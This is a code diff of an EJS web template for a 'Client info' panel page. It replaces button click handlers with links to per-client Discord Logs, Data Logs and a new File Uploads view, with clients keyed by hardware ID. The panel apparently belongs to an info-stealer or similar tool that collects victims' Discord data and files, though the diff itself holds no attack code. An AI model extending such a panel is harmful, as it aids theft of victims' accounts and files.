@@ -10,25 +10,20 @@
                     <p class="text align-self-center" style="padding-bottom: 25px; color: rgb(180, 180, 180)">Client info for <%= hwid %>.</p>
 
                     <div class="d-flex justify-content-center bd-highlight mb-3">
-                        <div class="p-2"><button type="button" class="btn btn-secondary" id="discordLogs">Discord Logs</button></div>
-                        <div class="p-2"><button type="button" class="btn btn-secondary" id="dataLogs">Data Logs</button></div>
+                        <div class="p-2">
+                            <a type="button" href="/panel/clients/<%= hwid %>/discord" class="btn btn-secondary">Discord Logs</a>
+                        </div>
+                        <div class="p-2">
+                            <a type="button" href="/panel/clients/<%= hwid %>/data" class="btn btn-secondary">Data Logs</a>
+                        </div>
+                        <div class="p-2">
+                            <a type="button" href="/panel/clients/<%= hwid %>/fileUploads" class="btn btn-secondary">File Uploads</a>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
         <%- include("includes/scripts.ejs") %>
-
-        <script type="text/javascript">
-            $(document).ready(function () {
-                $('#discordLogs').on('click', function () {
-                    window.location.href = '/panel/clients/<%= hwid %>/discord';
-                });
-
-                $('#dataLogs').on('click', function () {
-                    window.location.href = '/panel/clients/<%= hwid %>/data';
-                });
-            });
-        </script>
     </body>
 </html>
